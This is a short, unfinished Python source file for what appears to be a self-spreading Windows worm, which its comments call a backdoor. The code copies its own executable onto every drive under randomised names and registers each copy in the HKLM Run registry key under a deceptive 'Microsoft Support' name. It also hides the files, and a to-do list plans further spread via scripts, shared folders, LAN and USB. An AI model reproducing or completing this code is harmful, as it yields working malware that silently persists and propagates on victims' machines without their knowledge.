# ToDo list :
#   1)Spread in drivers,add to startup and continueos check (✓)
#   2)Spread in scripts by injecting [py/pl/ps1...]         (✘)
#   3)Spread in shared folders                              (✘)
#   4)Spread in lan                                         (✘)
#   5)Spread in usb                                         (✘)
#   6)Make a copy of itself online and use it in spreading  (✘)
#   7)[Advanced]Convert itself to executable and inject..   (✘)
#   8)...Still thinking :D
#
#       Note:Most of the functions would be for windows or all of it
#
import os,string,random,sys,glob,hashlib
from winreg import *

#Get the drivers on the pc
def drivers():
    drivs = []
    for i in string.ascii_uppercase:
        if os.path.isdir( i+":" ) == True:
            drivs.append( i+":" )
    return drivs

#Return a new random name for a file
def fname(name):
    if "." not in name :
        return name + str(random.randint(0,100))
    elif "." in name :
        return name.split(".")[0] + str(random.randint(0,100)) + "." + name.split(".")[1]

#To make the files check each other from hash not name
#Return MD5 hash of a file
def md5_checksum(fi):
    return hashlib.md5(open(fi, 'rb').read()).hexdigest()

#Add each copy of the backdoor to the startup
def Startup(worms):
    for worm in worms:
        hiddenPath = os.getcwd()
        hiddenPath = '\"' + hiddenPath + '\"'
        regPath = os.getcwd()
        regPath = regPath + r"\%s"%worm
        regPath = '\"' + regPath + '\"'
        regConnect = ConnectRegistry(None, HKEY_LOCAL_MACHINE)
        regKey = OpenKey(regConnect, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
        SetValueEx(regKey,"Microsoft Support part "+str(random.randint(0,100)),0, REG_SZ, r"" + regPath)
        #Hide the file
        os.system("attrib +h " + hiddenPath)

#Make a copy of the backdoor
def make_copy( old,new ):
    old_file = open( old,"rb" )
    new_file = open( new,"wb" )
    old_data = old_file.read()
    new_file.write( old_data )
    old_file.close()
    new_file.close()

#Spread backdoor copys in the pc drivers
def spread_in_drivers():
    drivs = drivers()
    #current_driver = os.getcwd().split( ":" )[0]
    name = sys.argv[0]
    f = open( name , "rb" )
    data = f.read()
    f.close()
    for driv in drivs:
        exist = 0
        os.chdir( driv )
        driv_files = glob.glob( "*.exe" )
        for fi in driv_files:
            if md5_checksum( fi ) == md5_checksum( name ):
                exist = 1
        if exist == 0 :
            make_copy( name,fname(name) )

#I will Continue later..
